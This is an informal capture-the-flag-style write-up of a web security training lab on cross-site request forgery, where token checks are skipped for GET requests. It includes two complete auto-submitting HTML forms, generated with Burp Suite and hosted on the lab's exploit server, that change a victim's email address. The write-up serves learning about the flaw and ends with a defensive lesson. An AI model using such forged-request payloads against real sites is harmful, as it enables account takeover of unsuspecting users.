## Detailed writeup of Csrf Practitioner lab(**CSRF where token validation depends on request method**)

Date:- 7 January 2025
Level:- Practitioner

As the situation is provided to us this lab contains a vunerablity in methods.

After reading,the first thing came in my mind is SameSite cookies as they also help to prevent csrf attacks and our chrome use **LAX** cookies as default.

But as i know LAX cookie can prevent attack upto the POST method so i decided to change the method of request.

1-At first i get log in into the lab using the given credentials as given below:
# Username-wiener
# Password-peter

When i get enter using the given credentials i get the option feild to update email so i just enter a testing email and capure the request at **Burp-Suite Professional** 

# I send the request to Repeater and see the **POST** method.

Then i saw the values of the feilds such as [Cookie Value,Email value and Csrf token value]

i send the request to **Engagement Tools** and generated a **CSRF poc GENERATOR**

The HTML CODE which i get is written below:-

<html>
  <body>
    <form action="https://0a9700ae049acb7c81c6118e00820017.web-security-academy.net/my-account/change-email" method="POST">
      <input type="hidden" name="email" value="admin111123&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="D5qjZtlDEhOsp17llpDLC5xUR4G3YnJB" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

After reading the HTML code i just change the method to **GET** and copy the request.

Then i move to the lab and get into exploit server where i store the payload given below:-

<html>
  <!-- CSRF PoC - generated by Burp Suite Professional -->
  <body>
    <form action="https://0a9700ae049acb7c81c6118e00820017.web-security-academy.net/my-account/change-email" method="GET">
      <input type="hidden" name="email" value="admin111123&#64;gmail&#46;com" />
      <input type="hidden" name="csrf" value="D5qjZtlDEhOsp17llpDLC5xUR4G3YnJB" />
      <input type="submit" value="Submit request" />
    </form>
    <script>
      history.pushState('', '', '/');
      document.forms[0].submit();
    </script>
  </body>
</html>

Then i saw the valuse and send the following code to victim server.

After sending it I change the **Email** and boom i just find the vunerablity on the lab interface.

**KEY-LEARNING**:-CSRF token should not be dependent on request method otherwise it can lead to security flaws.

Thankyou!!!

